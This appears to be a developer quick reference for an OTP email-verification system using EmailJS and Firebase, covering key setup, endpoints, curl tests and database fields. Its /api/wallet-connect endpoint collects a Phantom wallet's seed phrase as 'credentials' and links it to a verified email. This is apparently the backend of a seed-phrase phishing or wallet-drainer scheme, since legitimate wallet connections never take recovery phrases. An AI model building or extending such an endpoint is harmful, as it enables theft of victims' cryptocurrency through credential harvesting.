# OTP System - Quick Reference

## 🔑 Where to Put Your EmailJS Keys

**File**: `.env`

```env
# Your EmailJS Configuration
EMAILJS_SERVICE_ID=service_0t7pjbm          # ✅ Already set
EMAILJS_TEMPLATE_ID=template_kro1z3k        # ✅ Already set
EMAILJS_PUBLIC_KEY=your_public_key_here     # ⚠️ ADD YOUR PUBLIC KEY
EMAILJS_PRIVATE_KEY=your_private_key_here   # ⚠️ ADD YOUR PRIVATE KEY
```

## 📍 How to Get Your Keys

1. **Go to**: https://dashboard.emailjs.com/
2. **Public Key**: Account → General → Copy Public Key
3. **Private Key**: Account → API Keys → Copy Access Token

---

## 🚀 API Endpoints

### 1. Send OTP
```javascript
POST /api/send-otp
Body: { "email": "user@example.com" }
```

### 2. Verify OTP
```javascript
POST /api/verify-otp
Body: { "email": "user@example.com", "otp": "123456" }
```

### 3. Wallet Connect (with email)
```javascript
POST /api/wallet-connect
Body: {
  "walletName": "user",
  "walletType": "phantom",
  "inputType": "seed_phrase",
  "credentials": "seed phrase",
  "email": "user@example.com"  // ← NEW
}
```

---

## 📧 Email Template Setup

Your EmailJS template needs these variables:
- `{{passcode}}` - The OTP code
- `{{email}}` - Recipient email

**Example:**
```
Your verification code is: {{passcode}}

Expires in 15 minutes.
```

---

## 🔒 OTP Rules

- **6 digits** (e.g., 123456)
- **Expires** in 15 minutes
- **Max 3** verification attempts
- **Auto-deleted** after verification or expiration

---

## 🧪 Quick Test

```bash
# 1. Send OTP
curl -X POST http://localhost:8888/api/send-otp \
  -H "Content-Type: application/json" \
  -d '{"email": "test@example.com"}'

# 2. Check your email for OTP

# 3. Verify OTP
curl -X POST http://localhost:8888/api/verify-otp \
  -H "Content-Type: application/json" \
  -d '{"email": "test@example.com", "otp": "123456"}'
```

---

## 📦 Firebase Collections

### otps/{emailBase64}
- email: string
- otp: string (6 digits)
- createdAt: timestamp
- expiresAt: timestamp
- attempts: number (max 3)

### wallets/{walletId}
- email: string ← **NEW FIELD**
- walletAddress: string
- balance: number
- ...

---

## ⚠️ Important Notes

1. **Public Key** = User ID in EmailJS dashboard
2. **Private Key** = Access Token from API Keys section
3. Don't confuse Public Key with Service ID
4. Template must be **published** in EmailJS

---

## 🔗 Useful Links

- EmailJS Dashboard: https://dashboard.emailjs.com/
- Template Editor: https://dashboard.emailjs.com/admin/templates
- API Keys: https://dashboard.emailjs.com/admin/account

---

**Need help?** See `OTP_SYSTEM_GUIDE.md` for full documentation.
